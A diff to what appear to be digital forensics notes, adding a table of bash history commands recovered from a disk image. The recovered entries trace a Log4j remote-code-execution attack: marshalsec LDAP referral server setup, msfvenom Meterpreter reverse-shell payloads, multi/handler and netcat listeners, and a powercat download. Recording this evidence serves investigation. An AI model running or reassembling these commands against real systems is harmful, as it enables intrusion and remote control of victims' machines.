@@ -549,3 +549,177 @@ PLSQL < See File
 
 ## Windows
 ### Magnet Targeted Locations
+<details>
+<summary>Bash History</summary>
+
+| Artifact | Location |
+| -- | -- |
+| `curl -s https://install.zerotier.com \| sudo bash`,`zerotier-cli join 8056c2e21ccdf65a`,`ip a`,`ping 192.168.191.144`,`zerotier-cli`,`zerotier-cli listpeers`,`zerotier-cli info`,`ping 192.168.191.144` | /img_LenovoFinal.E01/vol_vol5/root/.bash_history |
+| `rm -rf 2022-01-31-231933.jpg ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get update` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get upgrade` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `Sudo apt-get install     ca-certificates     curl     gnupg     lsb-release` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get install     ca-certificates     curl     gnupg     lsb-release` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `echo   "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install cmatrix` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cmatrix` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `htop` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install htop` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `htop` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `[200~` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `curl -s https://install.zerotier.com | sudo bash` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo -i` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ping 192.168.191.144` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ping 192.168.191.144` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo -i` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp 9999` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `java --version ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `dpkg --lost | grep java` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `dpkg --list | grep java` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `dpkg --list | grep jdk` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get remove openjdk-11*` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `dpkg --list | grep jdk` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get remove openjdk-11-jre-headless:adm64` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get remo` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get purge openjdk*` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get autoremove` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get clean` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt-get install openjdk-8-jdk` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `git clone https://github.com/mbechler/marshalsec.git` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install git` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `git clone https://github.com/mbechler/marshalsec.git` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd marshalsec/` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install maven` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ps aux | grep -i apt` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `reboot` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp 9898` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp 4443` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp 9898` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp 4443` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lvp 4444` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp 4444` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd ..` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `git clone https://github.com/xiajun325/apache-log4j-rce-poc.git` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd apache-log4j-rce-poc/` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd ..` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd marshalsec/` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `mkdir poc` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd poc` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd ../../apache-log4j-rce-poc/` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd src` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd main` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd java` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `editor` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `editor log4j.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `editor log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `editor Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cp Log4jRCE.java ~/marshalsec/poc/` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd ~/marshalsec/poc` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `editor Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cat Log4jRCE.` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cat Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ls pla` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ls -la` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `editor Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `editor Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ls -la` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `javac Log4jRCE.java ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install maven` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd marshalsec/` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `mvn clean package -DskipTests` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.191.253/#test"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.191.253:8000/#Log4jRCE"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ssh 192.168.191.253` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `firefox` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd ..` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd Desktop` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `chmod 777 player.html ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo chmod 777 player.html ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ls -la` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo chown rafael player.html ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo chgrp rafael player.html ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cat ~/.msf4/logs/framework.log ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ls /sys/class/backlight` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install xrdp ` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `service postgresql status` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `apt install -y build-essential zlib1g zlib1g-dev libpq-dev libpcap-dev libsqlite3-dev ruby ruby-dev` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install -y build-essential zlib1g zlib1g-dev libpq-dev libpcap-dev libsqlite3-dev ruby ruby-dev` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install postgresql postgresql-contrib -y` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo systemctl enable --now postgresql` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `chmod +x msfinstall` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo ./msfinstall` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `msfdb init` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `msfdb status` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `msfconsole` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.191.253 LPORT=443 -f psh -o meterpreter-64.ps1` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cp meterpreter-64.ps1 poc/` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd poc` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.191.253; set lport 443; set ExitOnSession false; exploit -j"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.191.253; set lport 443; set ExitOnSession false; exploit -j"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.191.253 LPORT=444 -f psh -o meterpreter-64_2.ps1` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.191.253 LPORT=444 -f psh -o meterpreter-64_2.ps1` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.191.253; set lport 444; set ExitOnSession false; exploit -j"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `shutdown` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp 4444` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd poc` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `python3 -m http.server` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ping 192.168.191.144` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd marshalsec/` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.191.253:8000/#Log4jRCE"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `tcpdump -i eth0 -n 'tcp[tcpflags] & tcp-syn != 0 and not src and dst net localnet' | sed 's/^.*IP \([^ ]*) >.*$/\1/'` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo tcpdump -i eth0 -n 'tcp[tcpflags] & tcp-syn != 0 and not src and dst net localnet' | sed 's/^.*IP \([^ ]*) >.*$/\1/'` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo apt install wireshark` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo wireshark &` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ping 192.168.191.253` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ip a` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `ping 192.168.191.253` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `nc -lnvp 443` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo nc -lnvp 443` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo nc -lnvp 444` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo nc -lnvp 445` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo nc -lnvp 4444` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `msfconsole` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo msfconsole` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.191.253; set lport 443; set ExitOnSession false; exploit -j"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.191.253; set lport 444; set ExitOnSession false; exploit -j"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `cd ..` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.191.253:8000/#Log4jRCE"` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+| `htop` | /img_LenovoFinal.E01/vol_vol5/home/rafael/.bash_history |
+  
+</details>
